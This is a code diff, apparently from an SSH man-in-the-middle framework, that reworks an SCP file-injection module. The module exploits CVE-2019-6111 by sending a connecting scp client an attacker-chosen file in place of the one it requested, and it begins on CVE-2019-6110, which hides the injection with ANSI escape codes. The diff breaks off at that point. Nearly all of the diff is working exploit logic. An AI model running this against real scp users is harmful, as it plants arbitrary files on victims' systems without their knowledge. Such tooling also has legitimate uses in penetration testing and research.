@@ -28,49 +28,64 @@ class SCPInjectFile(SCPForwarder):
             help='file that is used for injection'
         )
 
-    def __new__(cls, session):
-        if session.scp_command.find(b'-f') != -1:
+    def __new__(cls, *args, **kwargs):
+        if args[0].scp_command.find(b'-f') != -1:
             return super(SCPInjectFile, cls).__new__(cls)
         else:
-            logging.info("Client is not downloading a file, reverting to normal SCPForwarder")
-            return SCPForwarder.__new__(cls)
+            logging.info("SCPClient is not downloading a file, reverting to normal SCPForwarder")
+            forwarder = SCPForwarder.__new__(SCPForwarder)
+            forwarder.__init__(args[0])
+            return forwarder
 
     def __init__(self, session) -> None:
         super().__init__(session)
         self.args.scp_inject_file = os.path.expanduser(self.args.scp_inject_file)
 
+        self.injectable = False
         self.inject_file_stat = os.stat(self.args.scp_inject_file)
         self.file_to_inject = open(self.args.scp_inject_file, 'rb')
 
-    def handle_traffic(self, traffic):
-        response = super(SCPInjectFile, self).handle_traffic(traffic)
-        self.sendall(self.session.scp_channel, response, self.session.scp_channel.send)
+    def process_data(self, traffic):
+        if traffic == b'\x00':
+            self.injectable = True
+            self.exploit()
+        return traffic
 
+    def handle_traffic(self, traffic):
+        logging.debug(traffic)
+        if not self.injectable:
+            return super(SCPInjectFile, self).handle_traffic(traffic)
+        else:
+            self.exploit()
+
+    def exploit(self):
         def wait_ok():
-            assert self.session.scp_channel.recv(1024) == b'\x00'
+            get = self.session.scp_channel.recv(1024)
+            logging.debug("EXPLOIT: " + str(get))
+            assert get == b'\x00'
 
         def send_ok():
+            logging.debug("EXPLOIT: x00")
             self.session.scp_channel.sendall(b'\x00')
 
+        send_ok()
         wait_ok()
-
         # This is CVE-2019-6111: whatever file the client requested, we send
         # them 'exploit.txt' instead.
         logging.info('Injecting file %s to channel %d', self.args.scp_inject_file, self.session.scp_channel.get_id())
         command = "{}{} {} {}\n".format(
             self.file_command,
-            self.inject_file_stat.st_mode,
+            "{0:o}".format(self.inject_file_stat.st_mode)[2:],
             self.inject_file_stat.st_size,
             self.args.scp_inject_file
         )
-
+        logging.info("Sending command %s", command)
         self.session.scp_channel.sendall(command)
         wait_ok()
         self.session.scp_channel.sendall(self.file_to_inject.read())
         self.file_to_inject.close()
         send_ok()
         wait_ok()
-
         # This is CVE-2019-6110: the client will display the text that we send
         # to stderr, even if it contains ANSI escape sequences. We can send
         # ANSI codes that clear the current line to hide the fact that a second
